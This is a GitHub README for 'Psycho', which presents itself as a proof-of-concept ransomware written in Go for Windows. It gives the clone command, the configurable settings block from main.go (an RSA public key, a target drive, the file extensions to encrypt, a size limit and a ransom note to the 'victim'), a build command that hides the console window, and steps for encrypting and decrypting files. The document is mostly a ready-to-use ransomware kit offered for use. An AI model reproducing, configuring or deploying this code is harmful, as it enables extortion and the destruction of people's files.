# Psycho
Psycho PoC ransomware
![alt text](https://github.com/Null-byte-00/images/blob/master/Free_Sample_By_Wix.jpg?raw=true)<br>
psycho is a PoC ransomware written in go<br><br>
tested on windows 10
## possibilities:
<ul>
<li>using hybrid encryption (witch is fast and safe)</li>
<li>customize settings</li>
<li>good appearance</li>
<li>changing background picture</li>
</ul>

## requirements:
<ul>
<li>gcc (added to Path)</li>
<li>golang (you can download from here: https://golang.org/dl/)</li>
<li>fyne (golang library: http://www.fyne.io/fyne)</li>
</ul>

## to use:

### clone the repository

```
git clone https://github.com/Null-byte-00/Psycho
```

### change settings

go to Psycho/psycho/main.go and change the settings:

```golang
	/*** SETTINGS ***/
	//server rsa public key ( if you want to change this you should first generate a rsa keypair next replace it in both ransomware and decryptor programs )
	serverpubkey := "-----BEGIN PUBLIC KEY-----\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA3eWrYNmEzwLXGT0HUqqu\nkrimoiBKZE9mIzWvN51YLONneY0B8/yiLgJxg5pUOp8AEnu3gQm9uPQzbdyZniQq\n58HzSS+2Py17/UWlwqZVueUQ/RBvhH/BaEDZlKK7SUzeUqWbC0klDeLQ1nY48DEJ\nD2wNkz3CWXgDqQ0tfOqy+hRrR6ispOZc7k2SDd6cX8jkKzacH7sxBDYDVT2E/nYP\nkOBcCUW2ywN/y0FE1uqxim+axwtFW652k5ARHalmOVIXM6Oky6r4x49MN8zkIZEC\nhGDIOxQGYUEtp+0NhmAMyl26DtI23NMjyTaB7+DYtEZzSYgBllmfla1RtoEgKaHI\ns30PIUvZQGmg6VcEEhfy0hbtjDjWANkBrNewK46mH9pwH2wsYmm9QSftUjF62PbM\nLrFxoJS1w6NeYTC+s5JqGnG3sftCzGXMI+VSRvoVAWU+mm/ntQj5yww4nRq4Ylre\nJZAsLRUfT87c5uomolGitlGPIyXjxhxgPzc5egvQ199BAgMBAAE=\n-----END PUBLIC KEY-----"
	//root directory ( only files in this directory and subfolders of this directory will be encrypted )
	rootdir := "H:\\"
	//valid file extensions to encrypt ( only files with these extensions will be encrypted )
	validfileextensions := []string{"lnk" ,"pdf", "doc", "docx", "docm", "xlsx", "xlsm", "jpg", "jpeg", "png", "mp3", "mp4", "mkv", "py", "cs", "c", "cpp"}
	//valid file size to encrypt ( only files that have the same or less weight than this will be encrypted )
	//here is 400MB --> 1024 * 1024 * 400 = 419430400
	validfilesize := 419430400
	//the massage you want to show to the victim
	message := "Hi dear victim!\n"
	message += "Some of your files are encrypted now\n"
	message += "do not waste your time there is no way \nto get your files back except our decryption service"
```

### create binary file

just go to Psycho/psycho directory and run: <br>

```
go build -ldflags -H=windowsgui main.go
```

-ldflags -H=windowsgui options will hide the console window

### run the file

just click on main.exe file<br>
after some seconds desktop ppicture will change and a window like this will appear<br>

![alt text](https://github.com/Null-byte-00/images/blob/master/psychodemo.png?raw=true)<br>


and you can see that some of your files are encrypted<br>

![alt text](https://github.com/Null-byte-00/images/blob/master/psychoencrypteddemo.png?raw=true)<br>

### decrypting files

to decrypt files click on Get victimkey button. you will see a notepad window. <br>

![alt text](https://github.com/Null-byte-00/images/blob/master/psychovictimkeydemo.png?raw=true)<br>

copy this text and go to Psycho/psychodecryptor and run:<br>

```
go run decryptor.go <victim key here>
```

decryptor will give you a 32 character text like this:<br>
```
k8T2fDFkKbdBwdlnbVgxJTucm0oNBdwa
```
now enter this text in Password textbox and click on Check password button. psycho will start to decrypt your files (it can take a while)<br>
![alt text](https://github.com/Null-byte-00/images/blob/master/psychodecryptdemo.png?raw=true)<br>

Now you got your files back<br>

and you can also see tutorial video here:<br>

[![IMAGE](https://img.youtube.com/vi/a8yX7jojYBo/0.jpg)](https://www.youtube.com/watch?v=a8yX7jojYBo)

Have fun!


